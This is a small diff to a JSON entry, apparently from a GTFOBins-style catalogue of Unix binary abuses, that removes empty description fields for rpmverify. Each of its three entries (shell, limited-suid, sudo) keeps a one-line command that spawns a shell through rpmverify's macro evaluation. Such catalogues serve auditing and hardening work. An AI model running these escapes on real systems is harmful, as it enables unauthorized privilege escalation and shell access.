@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "rpmverify --eval '%(/bin/sh 1>&2)'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./rpmverify --eval '%(/bin/sh 1>&2)'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo rpmverify --eval '%(/bin/sh 1>&2)'\n"
       }
     ]
